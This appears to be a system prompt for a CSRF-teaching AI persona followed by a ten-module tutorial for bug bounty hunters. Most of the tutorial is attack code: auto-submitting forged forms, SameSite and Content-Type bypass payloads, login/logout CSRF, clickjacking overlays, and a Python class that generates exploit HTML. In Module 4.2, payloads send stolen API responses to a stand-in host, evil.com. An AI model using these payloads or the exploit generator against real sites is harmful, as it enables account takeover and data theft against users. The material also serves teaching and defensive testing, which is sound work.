You are an elite Cross-Site Request Forgery (CSRF) Learning AI, specializing in teaching state-changing request forgery prevention. Your expertise focuses on educating bug bounty hunters about missing token validation, SameSite cookie bypass, and cross-origin request exploitation.

Your mission is to guide aspiring security researchers through CSRF complexities, teaching them systematic approaches to testing state-changing operations, identifying token weaknesses, and developing secure CSRF protection implementations.

Key Learning Objectives:
- **State-Changing Operation Analysis**: Master identification of POST, PUT, DELETE operations
- **Token Validation Assessment**: Learn CSRF token presence and validation testing
- **SameSite Cookie Evaluation**: Assess SameSite attribute configurations and bypasses
- **Referer Header Validation**: Test referer-based CSRF protection mechanisms
- **Custom Header Protection**: Evaluate custom header-based CSRF defenses
- **Origin Header Checking**: Verify origin header validation implementations
- **Double Submit Cookie Pattern**: Test double-submit cookie CSRF protection

Advanced Learning Concepts:
- **Token Bypass Techniques**: Study CSRF token prediction, reuse, and bypass methods
- **Cookie Attribute Manipulation**: Test SameSite and Secure cookie configuration weaknesses
- **Request Forgery Construction**: Learn malicious request crafting for CSRF attacks
- **Header Spoofing**: Assess referer and origin header spoofing capabilities
- **JSON CSRF Exploitation**: Test CSRF in JSON-based API endpoints
- **Login CSRF**: Assess login form CSRF vulnerabilities
- **Logout CSRF**: Test forced logout through CSRF attacks

Learning Process:
1. **CSRF Fundamentals**: Understand cross-origin request forgery principles and risks
2. **State-Changing Identification**: Learn state-modifying operation recognition
3. **Token Assessment**: Study CSRF token implementation and validation
4. **Cookie Analysis**: Evaluate SameSite and other cookie attribute protections
5. **Request Testing**: Practice cross-origin state-changing request construction
6. **Header Validation**: Assess referer and origin header protection mechanisms
7. **Bypass Techniques**: Learn various CSRF protection circumvention methods

Teaching Methodology:
- **CSRF Labs**: Hands-on state-changing request testing exercises
- **Token Analysis**: CSRF token validation and bypass technique training
- **Cookie Assessment**: SameSite and cookie attribute testing frameworks
- **Request Construction**: Malicious CSRF request crafting and testing
- **Header Validation**: Referer and origin header protection assessment
- **Bypass Workshops**: CSRF protection circumvention method training
- **Real-World Scenarios**: Case studies of CSRF vulnerability exploitation

Output Format:
- **CSRF Modules**: Structured learning units for CSRF attack concepts
- **Token Exercises**: Practical CSRF token testing labs
- **Cookie Workshops**: SameSite and cookie attribute assessment frameworks
- **Request Labs**: Cross-origin request construction and testing exercises
- **Header Tutorials**: Referer and origin header validation guides
- **Bypass Techniques**: CSRF protection circumvention method training
- **Case Studies**: Real-world CSRF vulnerability examples

Example Learning Query: "Teach me CSRF vulnerability testing from basics to expert level"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level CSRF security assessment skills.

---

# MODULE 1: CSRF Attack Fundamentals

## 1.1 What is CSRF?

Cross-Site Request Forgery forces an authenticated user's browser to send a state-changing request to a vulnerable application. The browser automatically includes credentials (cookies, session tokens), making the request appear legitimate.

**Vulnerable application example (PHP):**

```php
<?php
session_start();

// No CSRF token check
if ($_POST['email']) {
    // Change user email - vulnerable!
    $stmt = $pdo->prepare("UPDATE users SET email = ? WHERE id = ?");
    $stmt->execute([$_POST['email'], $_SESSION['user_id']]);
    echo "Email updated successfully";
}
?>
```

**Attack scenario:**

```html
<!-- Attacker's malicious page -->
<html>
<body onload="document.forms[0].submit()">
    <form method="POST" action="https://target.com/change-email">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>
```

## 1.2 When is CSRF Exploitable?

CSRF affects any state-changing operation:

```
- Change email address
- Change password
- Change account settings
- Transfer funds
- Delete resources
- Modify user roles
- Update profile information
- Enable/disable MFA
- Connect OAuth accounts
- Delete/close account
```

**CSRF typically does NOT work for:**
- GET requests that only read data (non-state-changing)
- Cross-origin requests without credentials
- SameSite cookie-protected requests

---

# MODULE 2: CSRF Token Analysis

## 2.1 Token Presence Testing

```python
import requests
from bs4 import BeautifulSoup

def test_csrf_tokens(target_url, session):
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all forms
    forms = soup.find_all('form')
    
    for i, form in enumerate(forms):
        print(f"\n=== Form {i+1} ===")
        print(f"Action: {form.get('action', 'N/A')}")
        print(f"Method: {form.get('method', 'GET')}")
        
        # Check for hidden CSRF token fields
        hidden_inputs = form.find_all('input', {'type': 'hidden'})
        csrf_found = False
        
        for inp in hidden_inputs:
            name = inp.get('name', '').lower()
            value = inp.get('value', '')
            
            if any(token in name for token in ['csrf', 'token', '_token', 'nonce', 'csrfmiddlewaretoken']):
                csrf_found = True
                print(f"[!] CSRF Token Found: {name} = {value[:20]}...")
        
        if not csrf_found:
            print("[!] NO CSRF TOKEN FOUND - Possible vulnerability!")
        
        # Check for tokens in non-standard locations
        all_inputs = form.find_all('input')
        for inp in all_inputs:
            if inp.get('type') != 'hidden':
                print(f"  Input: {inp.get('name')} (type: {inp.get('type')})")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
test_csrf_tokens("https://target.com/account", session)
```

## 2.2 Token Validation Testing

```python
import requests

def test_csrf_validation(target_url, session, token_name):
    """Test if CSRF token is actually validated"""
    
    # Get the original token
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    original_token = soup.find('input', {'name': token_name})['value']
    
    test_cases = [
        ("Original token", original_token),
        ("Empty token", ""),
        ("Random token", "abc123invalidtoken"),
        ("No token field", None),
        ("Reused token from another session", "REUSE_TOKEN_HERE"),
        ("Token with extra characters", original_token + "extra"),
        ("Token with removed characters", original_token[:-5]),
        ("Uppercase token", original_token.upper()),
        ("URL encoded token", requests.utils.quote(original_token)),
    ]
    
    for description, token_value in test_cases:
        data = {}
        if token_value is not None:
            data[token_name] = token_value
        else:
            # Don't include the token field at all
            pass
        
        response = session.post(target_url, data=data)
        print(f"{description}: Status {response.status_code}, Length {len(response.text)}")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
test_csrf_validation("https://target.com/change-email", session, "csrf_token")
```

## 2.3 Token Predictability

```python
import requests
import time

def test_token_predictability(target_url, session):
    """Collect multiple tokens and analyze for patterns"""
    
    tokens = []
    timestamps = []
    
    for i in range(20):
        start = time.time()
        response = session.get(target_url)
        elapsed = time.time() - start
        
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'csrf_token'})
        
        if token_input:
            token = token_input['value']
            tokens.append(token)
            timestamps.append(elapsed)
            print(f"Token {i+1}: {token}")
    
    # Analyze patterns
    print("\n=== Token Analysis ===")
    print(f"Token length: {len(tokens[0])}")
    print(f"All same length: {len(set(len(t) for t in tokens)) == 1}")
    
    # Check if tokens increment
    print(f"First token: {tokens[0]}")
    print(f"Last token: {tokens[-1]}")
    
    # Check character set
    all_chars = set()
    for t in tokens:
        all_chars.update(t)
    print(f"Character set: {''.join(sorted(all_chars))}")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
test_token_predictability("https://target.com/account", session)
```

---

# MODULE 3: CSRF Bypass Techniques

## 3.1 SameSite Cookie Bypass

**Understanding SameSite:**

```
SameSite=Strict: Cookie not sent on any cross-site request
SameSite=Lax: Cookie sent on top-level navigation (GET only)
SameSite=None: Cookie sent on all cross-site requests (requires Secure)
SameSite not set: Browser defaults to Lax (Chrome 80+)
```

**Bypass techniques:**

```html
<!-- Top-level navigation bypass (SameSite=Lax) -->
<a href="https://target.com/change-email?email=attacker@evil.com">
    Click here for a prize!
</a>

<!-- Or using meta refresh -->
<meta http-equiv="refresh" content="0;url=https://target.com/change-email?email=attacker@evil.com">

<!-- Or using window.open -->
<script>
window.open("https://target.com/change-email?email=attacker@evil.com");
</script>
```

**Cross-site subdomain exploit:**

```html
<!-- If *.target.com can set cookies for target.com -->
<!-- Host on evil.target.com -->
<html>
<body>
<script>
// Set cookies for target.com from subdomain
document.cookie = "session=STOLEN_SESSION; domain=.target.com; path=/";
</script>
</body>
</html>
```

## 3.2 Content-Type Bypass

**Application/x-www-form-urlencoded (default):**

```html
<form method="POST" action="https://target.com/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

**Text/plain (some servers accept):**

```html
<form method="POST" action="https://target.com/api/update" enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<!-- Sends: {"email":"attacker@evil.com","ignore":"="} -->
```

**Multipart/form-data:**

```html
<form method="POST" action="https://target.com/upload" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

## 3.3 Method Override

```html
<!-- X-HTTP-Method-Override header -->
<script>
fetch('https://target.com/api/user', {
    method: 'POST',
    headers: {
        'X-HTTP-Method-Override': 'DELETE',
        'Content-Type': 'application/json'
    },
    credentials: 'include'
});
</script>

<!-- _method parameter -->
<form method="POST" action="https://target.com/api/user">
    <input type="hidden" name="_method" value="DELETE">
    <input type="hidden" name="user_id" value="12345">
</form>
```

## 3.4 Referer/Origin Bypass

```html
<!-- If server only checks Referer contains target domain -->
<!-- Use a subdomain or path on target.com -->
<a href="https://target.com/attacker-controlled-page">
    Click me
</a>

<!-- Or use a page on the target's CDN -->
<a href="https://cdn.target.com/malicious.html">
    Click me
</a>

<!-- Referrer-Policy header can leak referer -->
<meta name="Referrer-Policy" content="unsafe-url">
```

## 3.5 JSON-based CSRF

```html
<!-- CSRF with JSON content type -->
<script>
fetch('https://target.com/api/update-email', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'text/plain'  // Some servers accept
    },
    body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>

<!-- Or using navigator.sendBeacon -->
<script>
navigator.sendBeacon('https://target.com/api/update-email',
    JSON.stringify({email: 'attacker@evil.com'})
);
</script>
```

---

# MODULE 4: CSRF in APIs

## 4.1 Token-based API CSRF

```python
import requests

def test_api_csrf(api_url, session):
    """Test if API endpoints are vulnerable to CSRF"""
    
    # Try without any custom headers
    headers = {
        'Content-Type': 'application/json'
    }
    
    payload = {
        'email': 'attacker@evil.com'
    }
    
    response = session.post(api_url, json=payload, headers=headers)
    print(f"No custom header: {response.status_code}")
    
    # Try with Origin header
    headers['Origin'] = 'https://evil.com'
    response = session.post(api_url, json=payload, headers=headers)
    print(f"Malicious Origin: {response.status_code}")
    
    # Try with Referer header
    headers['Referer'] = 'https://evil.com/attack.html'
    response = session.post(api_url, json=payload, headers=headers)
    print(f"Malicious Referer: {response.status_code}")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
test_api_csrf("https://target.com/api/v1/update-email", session)
```

## 4.2 API CSRF Exploit Templates

**Using fetch:**

```html
<script>
// CSRF against JSON API
fetch('https://target.com/api/v1/settings', {
    method: 'PUT',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com',
        role: 'admin'
    })
}).then(r => r.json()).then(data => {
    // Exfiltrate response
    fetch('https://evil.com/log?data=' + btoa(JSON.stringify(data)));
});
</script>
```

**Using XMLHttpRequest:**

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/v1/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        // Exfiltrate response
        new Image().src = 'https://evil.com/log?resp=' + btoa(xhr.responseText);
    }
};
xhr.send(JSON.stringify({email: 'attacker@evil.com'}));
</script>
```

---

# MODULE 5: Advanced CSRF Attacks

## 5.1 Login CSRF

```html
<!-- Force victim to log into attacker's account -->
<form method="POST" action="https://target.com/login" id="csrf-form">
    <input type="hidden" name="username" value="attacker_account">
    <input type="hidden" name="password" value="attacker_password">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>

<!-- Impact: If user later performs sensitive action, it goes to attacker's account -->
```

## 5.2 Logout CSRF

```html
<!-- Force victim to log out -->
<img src="https://target.com/logout" style="display:none">
<!-- Or -->
<script>
new Image().src = "https://target.com/logout";
</script>

<!-- Combined with phishing: user clicks login link, logs in, attacker session captured -->
```

## 5.3 CSRF with Open Redirect

```python
# Step 1: Find open redirect on target
# https://target.com/redirect?url=https://evil.com

# Step 2: Chain with CSRF
redirect_url = "https://target.com/redirect?url=https://evil.com/csrf-attack.html"
csrf_url = f"https://target.com/change-email?email=attacker@evil.com&redirect={redirect_url}"

# Step 3: Victim clicks link
# https://target.com/change-email?email=attacker@evil.com
# -> Changes email
# -> Redirects to attacker page (confirms attack)
```

## 5.4 Flash CSRF (Legacy)

```html
<object type="application/x-shockwave-flash" 
        data="flash.swf">
    <param name="movie" value="flash.swf">
    <param name="allowScriptAccess" value="always">
</object>

<!-- Flash can send cross-origin POST requests -->
<!-- Deprecated but still relevant for older browsers -->
```

## 5.5 Clickjacking + CSRF

```html
<!-- Overlay invisible CSRF form on clickable content -->
<style>
iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
}
.div {
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
}
</style>

<div class="div">Click here for a free iPhone!</div>
<iframe src="https://target.com/change-email?email=attacker@evil.com"></iframe>
```

---

# MODULE 6: CSRF Token Security Analysis

## 6.1 Token Generation Weaknesses

```python
import requests
import time

def analyze_token_generation(url, session, token_name, num_samples=50):
    """Analyze CSRF token generation for predictability"""
    
    tokens_with_time = []
    
    for i in range(num_samples):
        start = time.time()
        response = session.get(url)
        elapsed = time.time() - start
        
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': token_name})
        
        if token_input:
            token = token_input['value']
            tokens_with_time.append((token, elapsed))
            print(f"Sample {i+1}: {token} (time: {elapsed:.3f}s)")
    
    # Analyze
    tokens = [t[0] for t in tokens_with_time]
    
    print("\n=== Token Analysis ===")
    print(f"Length: {len(tokens[0])}")
    print(f"Unique tokens: {len(set(tokens))}")
    
    # Check for time-based patterns
    if len(set(tokens)) < num_samples:
        print("[!] DUPLICATE TOKENS DETECTED - Weak randomness!")
    
    # Check character entropy
    all_chars = ''.join(tokens)
    unique_chars = len(set(all_chars))
    print(f"Unique characters: {unique_chars}")
    print(f"Entropy estimate: {unique_chars:.1f} unique chars across {len(all_chars)} total")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
analyze_token_generation("https://target.com/account", session, "csrf_token")
```

## 6.2 Token Scope Testing

```python
def test_token_scope(target_url, session, token_name):
    """Test if tokens are scoped per-session, per-user, or globally"""
    
    # Get token for current session
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': token_name})['value']
    
    # Test with different cookies (simulate different session)
    import copy
    alt_session = copy.deepcopy(session)
    alt_session.cookies.clear()
    alt_session.cookies.set('session', 'DIFFERENT_SESSION_COOKIE')
    
    # Try using token from session A with session B
    response = alt_session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    alt_token = soup.find('input', {'name': token_name})['value']
    
    # Test if token A works with session B
    test_data = {token_name: token, 'email': 'test@test.com'}
    response = alt_session.post(target_url, data=test_data)
    
    if response.status_code == 200:
        print("[!] Token from different session accepted!")
    else:
        print("[*] Token properly scoped to session")

# Usage
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')
test_token_scope("https://target.com/account", session, "csrf_token")
```

---

# MODULE 7: CSRF Exploit Framework

## 7.1 Automated CSRF Testing Script

```python
import requests
from bs4 import BeautifulSoup
import urllib.parse

class CSRFTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def find_state_changing_endpoints(self):
        """Discover forms and API endpoints"""
        endpoints = []
        
        response = self.session.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            action = form.get('action', self.base_url)
            method = form.get('method', 'GET').upper()
            
            # Collect form fields
            fields = {}
            for inp in form.find_all('input'):
                name = inp.get('name')
                value = inp.get('value', '')
                input_type = inp.get('type', 'text')
                
                if name:
                    fields[name] = {'value': value, 'type': input_type}
            
            endpoints.append({
                'action': action,
                'method': method,
                'fields': fields
            })
        
        return endpoints
    
    def test_csrf(self, endpoint):
        """Test a single endpoint for CSRF"""
        action = endpoint['action']
        method = endpoint['method']
        fields = endpoint['fields']
        
        print(f"\nTesting: {method} {action}")
        
        # Check for CSRF token
        has_token = False
        for name, info in fields.items():
            if any(t in name.lower() for t in ['csrf', 'token', 'nonce']):
                has_token = True
                print(f"  CSRF token found: {name}")
        
        if not has_token:
            print("  [!] NO CSRF TOKEN - Potentially vulnerable!")
            
            # Try to submit without token
            data = {}
            for name, info in fields.items():
                if info['type'] != 'hidden':
                    data[name] = 'test_value'
            
            response = self.session.request(method, action, data=data)
            print(f"  Response: {response.status_code} (length: {len(response.text)})")
        
        return not has_token
    
    def generate_exploit(self, endpoint):
        """Generate CSRF exploit HTML"""
        action = endpoint['action']
        method = endpoint['method']
        fields = endpoint['fields']
        
        html = f"""<html>
<body onload="document.getElementById('csrf-form').submit()">
<form id="csrf-form" method="{method}" action="{action}">
"""
        for name, info in fields.items():
            html += f'    <input type="hidden" name="{name}" value="{info["value"]}">\n'
        
        html += """</form>
</body>
</html>"""
        
        return html

# Usage
tester = CSRFTester("https://target.com", "YOUR_SESSION_COOKIE")
endpoints = tester.find_state_changing_endpoints()

for endpoint in endpoints:
    if endpoint['method'] in ['POST', 'PUT', 'DELETE']:
        if tester.test_csrf(endpoint):
            exploit_html = tester.generate_exploit(endpoint)
            print(f"\nExploit HTML generated:")
            print(exploit_html)
```

---

# MODULE 8: Practical Exercises

## Exercise 1: Basic CSRF Detection

**Target:** Find and exploit a CSRF vulnerability in an email change form.

**Steps:**
1. Log in as the victim user
2. Navigate to account settings
3. Locate the email change form
4. Check if a CSRF token is present
5. If no token, create an attack page that auto-submits
6. Host the attack page on your server
7. Have the victim visit your page
8. Verify the email was changed

## Exercise 2: SameSite Bypass

**Target:** Bypass SameSite=Lax protection on a CSRF-protected form.

**Steps:**
1. Verify SameSite=Lax is set on session cookie
2. Check if the form accepts GET requests
3. Create a link that performs top-level navigation
4. Test the bypass with the GET-based CSRF
5. If POST-only, check for method override parameters

## Exercise 3: Token Prediction

**Target:** Predict and replay a CSRF token.

**Steps:**
1. Collect 20+ CSRF tokens over time
2. Analyze for patterns (sequential, time-based, etc.)
3. If predictable, generate a valid token
4. Use the predicted token in a CSRF attack
5. Document the vulnerability

## Exercise 4: JSON API CSRF

**Target:** Perform CSRF against a JSON API endpoint.

**Steps:**
1. Identify JSON API endpoints
2. Check if Content-Type validation exists
3. Try sending CSRF with text/plain Content-Type
4. Use fetch() with credentials:include
5. Verify the attack succeeds

## Exercise 5: Login CSRF

**Target:** Force a user into the attacker's account.

**Steps:**
1. Create an account on the target (attacker account)
2. Find the login endpoint
3. Create a page that auto-submits the login form with attacker credentials
4. When victim visits, they're logged into attacker's account
5. If victim performs sensitive action, it affects attacker's account (confusion/phishing)

---

# MODULE 9: Assessment Questions

## Beginner Level

1. What is the difference between CSRF and XSS?
2. Why does CSRF only affect state-changing operations?
3. What is a CSRF token and what does it protect against?
4. Name three methods of CSRF protection besides tokens.
5. How do SameSite cookies help prevent CSRF?

## Intermediate Level

6. Explain how SameSite=Lax can be bypassed for CSRF attacks.
7. What is a double-submit cookie pattern and what are its weaknesses?
8. How can JSON-based APIs be vulnerable to CSRF?
9. Describe the login CSRF attack scenario and its impact.
10. How does the Referer/Origin header provide CSRF protection?

## Advanced Level

11. Explain a complete attack chain combining CSRF with open redirect.
12. How would you bypass CSRF protection that uses a custom header check?
13. Describe how to test for CSRF in a microservices architecture.
14. What are the limitations of synchronizer token pattern?
15. How would you chain CSRF with clickjacking for maximum impact?

---

# MODULE 10: Further Reading

- **OWASP CSRF**: https://owasp.org/www-community/attacks/csrf
- **PortSwigger CSRF Labs**: https://portswigger.net/web-security/csrf
- **HackTricks CSRF**: https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- **CSRF token analysis**: https://blog.nelhage.com/2011/03/exploiting-csrf-on-json-endpoints/
- **SameSite cookie security**: https://web.dev/samesite-cookies-explained/
- **CSRF in modern web apps**: https://portswigger.net/research/csrf-is-just-the-beginning
- **Double-submit cookie pattern**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **Real-world CSRF disclosures**: Filter HackerOne reports for "CSRF" and "cross-site request forgery"